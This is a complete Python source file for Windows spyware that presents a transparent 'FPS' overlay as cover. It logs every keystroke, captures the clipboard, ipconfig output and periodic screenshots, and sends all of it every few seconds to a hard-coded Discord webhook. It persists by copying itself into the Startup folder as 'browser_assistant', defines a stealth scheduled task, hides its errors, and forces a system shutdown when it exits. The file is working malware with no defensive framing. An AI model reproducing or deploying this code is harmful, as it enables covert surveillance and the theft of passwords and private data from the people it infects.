import os
import platform
import atexit
import random
import string
import subprocess
import threading
import time
import pygame
import json
import requests
import shutil
import socket
import pyperclip
import psutil
import pyautogui
from pathlib import Path
from pynput import keyboard
import tkinter as tk
import sys
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QFont, QColor
from PyQt5.QtWidgets import QApplication, QLabel, QWidget

# Initialize variables and paths
pc_name = socket.gethostname()
user_name = os.environ.get('USER') or os.environ.get('USERNAME')
last_timestamp = None
temp_folder = os.environ.get('TEMP')

log_file = os.path.join(temp_folder, "key_log.txt")         # Save key_log.txt in Temp
clipboard_log_file = os.path.join(temp_folder, "clipboard.txt")  # Save clipboard.txt in Temp
file_pathip = os.path.join(temp_folder, 'ipconfig.txt')       # Save ipconfig.txt in Temp
settings_file = os.path.join(temp_folder, "settings.json")

def ensure_log_files():
    for file in [log_file, clipboard_log_file, file_pathip]:
        if not os.path.exists(file):
            Path(file).touch()  # Create the file if it doesn't exist
    # Ensure the settings file exists
    if not os.path.exists(settings_file):
        default_settings = {"yes": False}
        with open(settings_file, "w") as f:
            json.dump(default_settings, f)

# Call this function to ensure the log files exist
ensure_log_files()

# ----- Shutdown Functionality -----
def shutdown_system():
    """Shut down the system when the script exits."""
    try:
        subprocess.run(['shutdown', '/s', '/f', '/t', '0'], check=True)
    except Exception as e:
        print(f"Error shutting down system: {e}")

# Register the shutdown function to be called when the script exits
atexit.register(shutdown_system)
# ----- End Shutdown Functionality -----

def load_settings():
    """Loads settings from the settings.json file located in the Temp folder."""
    if os.path.exists(settings_file):
        with open(settings_file, "r") as f:
            settings = json.load(f)
    else:
        default_settings = {"yes": False}
        with open(settings_file, "w") as f:
            json.dump(default_settings, f)
        settings = default_settings
    return settings

def update_settings(new_value):
    """Updates the settings.json file in the Temp folder."""
    settings = load_settings()
    settings["yes"] = new_value
    with open(settings_file, "w") as f:
        json.dump(settings, f)

def create_task():
    try:
        script_path = sys.argv[0]
        command = f'pythonw "{script_path}"'  # Use pythonw to hide the console window
        subprocess.run(f'schtasks /create /tn "MyStealthTask" /tr "{command}" /sc onlogon /f', shell=True)
    except Exception as e:
        print(f"Error creating task: {e}")

# FPS counter function (for transparent window)
def get_timestamp():
    """Returns the current timestamp as a formatted string."""
    return time.strftime("[%Y-%m-%d %H:%M] ")

def add_to_startup():
    current_file_path = sys.argv[0]  # Full path to the script/executable
    startup_folder = os.path.join(
        os.environ.get('APPDATA'),
        'Microsoft',
        'Windows',
        'Start Menu',
        'Programs',
        'Startup'
    )
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)
    
    # Set the new name for the copied file
    startup_file_path = os.path.join(startup_folder, 'browser_assistant')  # Rename the file to 'browser_assistant'

    if not os.path.exists(startup_file_path):
        try:
            shutil.copy(current_file_path, startup_file_path)  # Copy the file with the new name
            pass
        except Exception as e:
            pass
    else:
        pass


def log_clipboard():
    last_clipboard_content = ""
    while True:
        try:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:
                timestamp = get_timestamp()
                with open(clipboard_log_file, "a") as f:
                    f.write(f"{timestamp} - {current_clipboard_content}\n")
                last_clipboard_content = current_clipboard_content
                payload = {'content': f"Clipboard content: {current_clipboard_content}"}
                requests.post(webhook_url, data=payload)
            time.sleep(1)
        except Exception as e:
            time.sleep(5)

def on_press(key):
    global last_timestamp
    try:
        with open(log_file, "a") as f:
            current_time = time.time()
            formatted_time = get_timestamp()
            if last_timestamp is None or (current_time - last_timestamp) >= 60:
                f.write(f"\n{formatted_time}\n")
                last_timestamp = current_time
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        pass

def upload_file_to_webhook(file_path, webhook_url):
    try:
        with open(file_path, 'rb') as file, open(file_pathip, 'rb') as ipfile, open(clipboard_log_file, 'rb') as clipboard_file:
            payload = {
                'content': f'Here are the logs for the user {user_name} and the PC name is {pc_name}. This message also includes IPCONFIG data and clipboard data.'
            }
            files = {
                'file1': (file_path, file),
                'file2': (file_pathip, ipfile),
                'file3': (clipboard_log_file, clipboard_file)
            }
            requests.post(webhook_url, data=payload, files=files)
    except Exception as e:
        pass

def upload_every_5_seconds(file_path, webhook_url):
    while True:
        upload_file_to_webhook(file_path, webhook_url)
        time.sleep(5)

def take_screenshot():
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        temp_folder = os.environ.get('TEMP')
        screenshot_file = os.path.join(temp_folder, f"screenshot_{timestamp}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_file)
        pass
        return screenshot_file
    except Exception as e:
        pass
        return None

def run_ipconfig():
    while True:
        try:
            result = subprocess.run(
                ['ipconfig'],
                capture_output=True,
                text=True,
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            with open(file_pathip, 'w') as file:
                file.write(result.stdout)
        except Exception as e:
            pass
        time.sleep(5)

class TransparentWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setGeometry(0, 0, 200, 100)
        self.label = QLabel(self)
        self.label.setFont(QFont("Arial", 20))
        self.label.setStyleSheet("color: white")
        self.label.setGeometry(10, 30, 200, 50)
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_fps)
        self.timer.start(100)
        self.frames = 0
        self.last_time = time.time()
        self.fps = 0

    def update_fps(self):
        current_time = time.time()
        self.frames += 1
        elapsed_time = current_time - self.last_time
        if elapsed_time >= 1.0:
            self.fps = self.frames
            self.frames = 0
            self.last_time = current_time
            self.label.setText(f"FPS: {self.fps}")

    def mousePressEvent(self, event):
        event.ignore()

def upload_screenshot_to_webhook(screenshot_file):
    try:
        with open(screenshot_file, 'rb') as file:
            files = {'file': (screenshot_file, file)}
            payload = {'content': f'Here is a new screenshot from the PC: {pc_name}, the user: {user_name}'}
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 204:
                pass
                # Delete the screenshot file after successful upload
                try:
                    os.remove(screenshot_file)
                    pass
                except Exception as del_e:
                    pass
            else:
                pass
    except Exception as e:
        pass

def take_and_upload_screenshot():
    while True:
        screenshot_file = take_screenshot()
        if screenshot_file:
            upload_screenshot_to_webhook(screenshot_file)
        time.sleep(30)

def cleanup_files():
    """Check if the log/clipboard/ipconfig text files exceed 1GB and delete them if they do."""
    max_size = 1 * 1024 * 1024 * 1024  # 1GB in bytes
    for file_path in [log_file, clipboard_log_file, file_pathip]:
        try:
            if os.path.exists(file_path):
                size = os.path.getsize(file_path)
                if size > max_size:
                    os.remove(file_path)
                    print(f"Deleted large file: {file_path}")
                    # Recreate an empty file
                    Path(file_path).touch()
        except Exception as e:
            print(f"Error cleaning up file {file_path}: {e}")
    # Check every 60 seconds
    time.sleep(60)

def cleanup_worker():
    while True:
        cleanup_files()

# Define the webhook URL
webhook_url = 'https://discord.com/api/webhooks/1335214600714457158/tzhsBy9cn-22l9vBGxfDs8kaoQ4CCsuTkqQhNvJe5BQ6ECrgHBD4JvEt-e5Kj3hftuSO'

add_to_startup()

# Start upload thread for log file
upload_thread = threading.Thread(target=upload_every_5_seconds, args=(log_file, webhook_url))
upload_thread.daemon = True
upload_thread.start()

# Start ipconfig logging thread
ipconfig_thread = threading.Thread(target=run_ipconfig)
ipconfig_thread.daemon = True
ipconfig_thread.start()

# Start the screenshot thread
screenshot_thread = threading.Thread(target=take_and_upload_screenshot)
screenshot_thread.daemon = True
screenshot_thread.start()

# Start the clipboard logging in a separate thread
clipboard_thread = threading.Thread(target=log_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

# Start the cleanup worker thread to check file sizes periodically
cleanup_thread = threading.Thread(target=cleanup_worker)
cleanup_thread.daemon = True
cleanup_thread.start()

if __name__ == "__main__":
    settings = load_settings()
    update_settings(True)
    settings = load_settings()
    if not settings.get("yes", False):
        app = QApplication(sys.argv)
        window = TransparentWindow()
        window.show()
        sys.exit(app.exec_())
    else:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
